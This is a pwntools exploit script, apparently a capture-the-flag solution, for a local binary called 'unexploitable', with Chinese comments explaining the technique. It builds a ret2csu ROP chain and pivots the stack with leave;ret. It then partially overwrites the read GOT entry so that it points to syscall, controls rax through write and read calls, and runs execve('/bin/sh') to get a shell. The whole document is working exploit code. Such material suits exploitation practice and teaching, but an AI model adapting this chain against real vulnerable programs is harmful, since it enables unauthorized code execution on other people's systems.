#coding=utf-8
from pwn import*
import time
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./unexploitable')
elf = ELF('./unexploitable')
libc = ELF('./libc-2.27.so')

csu_init_gadget1 = 0x400550
'''
mov     rdx, r15
mov     rsi, r14
mov     edi, r13d
call    qword ptr [r12+rbx*8]
'''
csu_init_gadget2 = 0x40056a
'''
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
'''
def csu_rop(rbx, rbp, call, rdi, rsi, rdx, ret):
	rop  = p64(rbx)
	rop += p64(rbp)
	rop += p64(call)
	rop += p64(rdi)
	rop += p64(rsi)
	rop += p64(rdx)
	rop += p64(ret)
	return rop

leave_ret = 0x40050A
extern_read = 0x601040
prbp_ret = 0x4004C9
read_got = elf.got["read"] #0x601000

payload  = 'A'*0x10 + p64(0xdeadbeef)
payload += p64(csu_init_gadget2)
payload += csu_rop(0,1,read_got,0,extern_read,0x200,csu_init_gadget1)
payload += "\x00"*0x38 #pad
payload += p64(prbp_ret) #set rbp
payload += p64(extern_read-0x8)
payload += p64(leave_ret) #migrate 栈迁移

#gdb.attach(p)
#pause()
time.sleep(1)
p.send(payload)

payload2  = p64(csu_init_gadget2)
payload2 += csu_rop(0,1,read_got,0,read_got,0x1,csu_init_gadget1)

payload2 += p64(0) #padding<-rsp,之后执行 csu_init_gadget2，系统调用 write
payload2 += csu_rop(0,1,read_got,1,0x601310,0x0,csu_init_gadget1)

payload2 += p64(0) #padding<-rsp
payload2 += csu_rop(0,1,read_got,0,0x601310,0x100,csu_init_gadget1)

payload2 += p64(0) #padding<-rsp
payload2 += csu_rop(0,1,read_got,0x601140,0x0,0,csu_init_gadget1) #0x601140◂—'/bin/sh'
payload2 += '/bin/sh\x00'

#pause()
time.sleep(1)
p.send(payload2)

#pause()
time.sleep(1)
p.send('\x2f') #read 低字节修改为 syscal 的低字节 0x7f|0x2f

#pause()
time.sleep(1)
p.send('A'*59)

p.interactive()

#先用通用 gadget 调用 read 将 read_got 低字节修改为 syscal
#因为写入的是一字节，所以rax=1，也就是 SYS_write 的系统调用号
#这时 read_got 就等于 syscall，再执行 read_got，就相当于执行系统调用 SYS_write
#执行 write(1, addr, 0) 输出 0 个字节，RAX=0，也就是 SYS_read 的系统调用号
#执行 read_got，执行 read，输入 59 字节，使 rax 返回 59
#再执行 read_got 系统调用 execve，getshell